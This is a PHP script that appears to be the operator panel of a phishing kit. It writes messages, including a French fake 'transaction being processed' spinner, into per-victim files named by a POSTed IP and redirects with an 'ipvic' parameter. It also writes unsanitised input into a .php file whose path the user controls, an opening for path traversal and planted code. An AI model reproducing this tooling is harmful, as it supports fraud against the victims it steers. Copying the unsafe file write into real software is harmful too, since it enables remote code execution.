<?php

session_start();

//echo "hey";exit;

send_info();

function send_info()
{
    //var_dump($_POST);exit;

    $error = '';

    if (isset($_POST)) {

        // var_dump($_POST);exit;
        $msg = '<img id="img-spinner" src="img/spinner.gif" alt="Your transaction is being processed"><br>Veuillez patientez quelques instant...  ';


        $message = "";

        if ($_POST['message'] == 1) $message = $msg;
        else $message = $_POST['message'];


        $ip = $_POST['ip'];
        //  var_dump(response($ip,$message));exit;
        if (response($ip, $message)) {
            $success = 'Votre message a bien été envoyé. Merci !';
            $_SESSION['msgsup'] = $success;
        } else {
            $error = 'Non envoyer!';
            $_SESSION['msgsup'] =  $error;
        }

        // var_dump($message);exit;
        header('Location:./sendresponse.php?ipvic=' . $ip);
        return;
    }
}

function response($ip, $msg)
{
    $path = './data/' . $ip . '.php';

    // Open the file for writing (create if it doesn't exist)
    $file = fopen($path, 'w');

    // Check if the file was opened successfully
    if (!$file) {
        echo 'File could not be opened';
        // exit;
        return false;
    }

    // Write the message to the file
    $bytesWritten = fwrite($file, $msg);

    // Close the file
    fclose($file);

    // Check if writing to the file was successful
    if ($bytesWritten === false) {
        echo 'File could not be updated';
        return false;
    } else {
        echo 'File has been updated!';
        return true;
    }
}
